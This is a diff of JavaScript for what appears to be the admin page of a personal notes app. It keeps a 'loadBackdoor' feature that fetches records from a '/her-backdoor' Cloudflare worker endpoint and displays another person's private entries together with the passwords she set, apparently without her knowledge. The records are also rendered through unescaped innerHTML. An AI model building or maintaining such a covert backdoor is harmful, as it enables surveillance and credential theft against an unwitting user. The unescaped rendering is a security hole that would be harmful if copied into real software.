@@ -1141,8 +1141,6 @@ if (localStorage.getItem('admin_logged_in') === 'true') {
   }
 });
 
- const WORKER_URL = 'https://empty-bird-fb8b.cedricmeng24.workers.dev';
-
 document.getElementById('loadBackdoor').addEventListener('click', async () => {
   const pwd = prompt('输入 LOGS_PASSWORD：');
   if (!pwd) return;
@@ -1151,8 +1149,8 @@ document.getElementById('loadBackdoor').addEventListener('click', async () => {
   st.textContent = '加载中...';
   listEl.innerHTML = '';
   try {
-    const res = await fetch(`${WORKER_URL}/her-backdoor?pwd=${encodeURIComponent(pwd)}`);
-    if (res.status === 401) { st.textContent = '密码不正确'; return; }
+    const res = await fetch(`https://empty-bird-fb8b.cedricmeng24.workers.dev/her-backdoor?pwd=${encodeURIComponent(pwd)}`);
+    if (res.status === 401) { st.textContent = '密码不对'; return; }
     if (!res.ok) throw new Error('HTTP ' + res.status);
     const data = await res.json();
     if (!data.length) { st.textContent = '还没有记录。'; return; }
@@ -1160,7 +1158,7 @@ document.getElementById('loadBackdoor').addEventListener('click', async () => {
       const div = document.createElement('div');
       div.className = 'log-item';
       div.innerHTML = `
-        <div class="log-time">${item.title || '无标题'} · ${item.updatedAt || ''} · ${item.lockType}</div>
+        <div class="log-time">${item.title || '无题'} · ${item.updatedAt || ''} · ${item.lockType}</div>
         <div class="log-meta" style="color:#c00;">她设的密码：${item.password || '（无）'}</div>
         <div style="color:#111827;font-size:14px;margin-top:6px;white-space:pre-wrap;">${item.text || ''}</div>
       `;
